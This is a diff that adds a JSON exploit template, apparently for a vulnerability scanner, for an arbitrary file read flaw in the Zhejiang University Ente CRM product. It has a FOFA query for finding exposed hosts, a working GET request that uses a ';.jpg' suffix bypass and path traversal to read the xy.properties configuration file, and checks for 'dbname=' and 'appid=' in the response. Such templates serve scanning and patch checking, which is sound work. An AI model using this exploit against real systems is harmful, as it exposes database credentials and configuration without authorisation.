@@ -1,0 +1,35 @@
+{
+  "product": "浙大恩特CRM",
+  "vul_name": "浙大恩特CRM Ri0004_openFileByStream.jsp接口任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源,提升销售和市场营销的效果。浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞。该漏洞可能会对系统的完整性和安全性产生严重影响。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"浙大恩特客户资源管理系统\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486163&idx=1&sn=be62990ea16076d51fba74099ada6664&chksm=974b87d4a03c0ec25569a4fe6371b5762a9974bd3ffc75871c8a8641d676354a0b4f3b1d8d83&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "dbname="
+        },
+        {
+          "body": "appid="
+        }
+      ]
+    }
+  }
+}
